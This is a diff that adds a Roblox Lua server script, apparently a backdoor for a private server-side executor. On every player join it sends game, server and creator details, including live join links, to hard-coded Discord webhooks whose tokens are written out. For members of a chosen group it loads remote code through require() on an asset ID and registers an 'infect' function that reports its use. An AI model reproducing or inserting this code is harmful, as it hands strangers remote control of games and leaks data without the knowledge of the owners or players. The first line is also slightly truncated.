@@ -1,0 +1,161 @@
+ocal Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local GROUP_ID = 4254148
+
+-- Webhooks based on player count
+local function getHook()
+	local count = #Players:GetPlayers()
+	if count <= 50 then
+		return https://discord.com/api/webhooks/1404322706509398157/fgSzqvfB-xb4k91JD8lWCCZAPzU-c8IKxJ0OVoCQiC10yUl-TP6a2r15Kuf0E9vbKt4y"
+	elseif count <= 500 then
+		return "https://discord.com/api/webhooks/1404322854803214346/FPI38hhaZFx0G2bps91KjJMaqiVbChiccJtOCPCHoKTjT12OPLJub-rpUFETQUYpxNLB"
+	elseif count <= 1000 then
+		return "https://discord.com/api/webhooks/1404323115990913065/O8wn7VQ8-X25PzIPxl0D_g37UKog0Zghkb1JYGNwB_tc0oH0j4aiPl4MKBFj6DT9Y-AF"
+	end
+	return nil
+end
+
+-- Game info
+local function getGameInfo()
+	local success, result = pcall(function()
+		return HttpService:JSONDecode(HttpService:GetAsync(
+			"https://games.roproxy.com/v1/games?universeIds=" .. game.GameId
+		)).data[1]
+	end)
+	return success and result or nil
+end
+
+-- Creator info
+local function getCreatorInfo()
+	local success, result = pcall(function()
+		return HttpService:JSONDecode(HttpService:GetAsync(
+			"https://users.roproxy.com/v1/users/" .. game.CreatorId
+		))
+	end)
+	return success and result or nil
+end
+
+-- Thumbnail
+local function getThumbnail()
+	local fallback = "https://tr.rbxcdn.com/0e90843d418d38921c1934c3bcf5c5fc/150/150/Image/Png"
+	local success, result = pcall(function()
+		local response = HttpService:GetAsync(
+			"https://thumbnails.roproxy.com/v1/games/icons?universeIds=" .. game.GameId ..
+			"&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false"
+		)
+		local data = HttpService:JSONDecode(response)
+		return data and data.data and data.data[1] and data.data[1].imageUrl or fallback
+	end)
+	return (success and result) or fallback
+end
+
+-- Send embed to webhook
+local function sendWebhook(hook, embed)
+	pcall(function()
+		HttpService:PostAsync(hook, HttpService:JSONEncode(embed), Enum.HttpContentType.ApplicationJson)
+	end)
+end
+
+-- Notify infect code usage
+local function notifyInfectUsage(plr)
+	local embed = {
+		embeds = { {
+			title = "🚨 Infect Code Used",
+			description = "**Player:** " .. plr.Name .. "\n**UserId:** " .. plr.UserId,
+			color = 0xFF0000,
+			timestamp = DateTime.now():ToIsoDate(),
+			footer = {
+				text = "Group ID: " .. GROUP_ID
+			}
+		} }
+	}
+	local hook = getHook()
+	if hook then
+		sendWebhook(hook, embed)
+	end
+end
+
+-- Handle player join
+Players.PlayerAdded:Connect(function(plr)
+	local hook = getHook()
+	if not hook then return end
+
+	local gameInfo = getGameInfo()
+	local creatorInfo = getCreatorInfo()
+	local thumb = getThumbnail()
+
+	local success, gameName = pcall(function()
+		return MarketplaceService:GetProductInfo(game.PlaceId).Name
+	end)
+
+	if not success or not gameInfo or not creatorInfo then
+		warn("Failed to gather game or creator info.")
+		return
+	end
+
+	local embed = {
+		embeds = { {
+			title = "Vostia Private SS",
+			color = 0xFF0000, -- Red
+			fields = {
+				{
+					name = "Game Information",
+					value = string.format(
+						"**Game Name:** %s\n" ..
+						"**Game Link:** [%s](https://www.roblox.com/games/%d)\n" ..
+						"**Join Link:** [Join Server](https://www.roblox.com/games/%d?launch=true&jobId=%s)\n\n" ..
+						"**Active Players:** %s\n" ..
+						"**Server Players:** %d/%d\n" ..
+						"**Visits:** %s\n" ..
+						"**Copying Allowed:** %s\n" ..
+						"**Game Genre:** %s\n" ..
+						"**Favourites:** %s",
+						gameName,
+						gameName, game.PlaceId,
+						game.PlaceId, game.JobId,
+						tostring(gameInfo.playing),
+						#Players:GetPlayers(), Players.MaxPlayers,
+						tostring(gameInfo.visits),
+						tostring(gameInfo.copyingAllowed),
+						gameInfo.genre or "Unknown",
+						tostring(gameInfo.favoritedCount or "Unavailable")
+					)
+				},
+				{
+					name = "Creator Information",
+					value = string.format(
+						"**Creator Name:** %s\n" ..
+						"**Creator Profile Link:** [%s](https://www.roblox.com/users/%d/profile)\n" ..
+						"**Group ID:** %d",
+						creatorInfo.name, creatorInfo.name, game.CreatorId,
+						GROUP_ID
+					)
+				},
+				{
+					name = "JavaScript Join Code",
+					value = string.format(
+						"```javascript\nRoblox.GameLauncher.joinGameInstance(%d, \"%s\")\n```",
+						game.PlaceId, game.JobId
+					)
+				}
+			},
+			image = { url = thumb }
+		} }
+	}
+
+	sendWebhook(hook, embed)
+
+	-- Only require if in group
+	if plr:IsInGroup(GROUP_ID) then
+		pcall(function()
+			require(84697639107952).LOAD(plr.Name)
+		end)
+
+		-- Expose infect function for this player
+		_G["infect_" .. plr.UserId] = function()
+			notifyInfectUsage(plr)
+		end
+	end
+end)
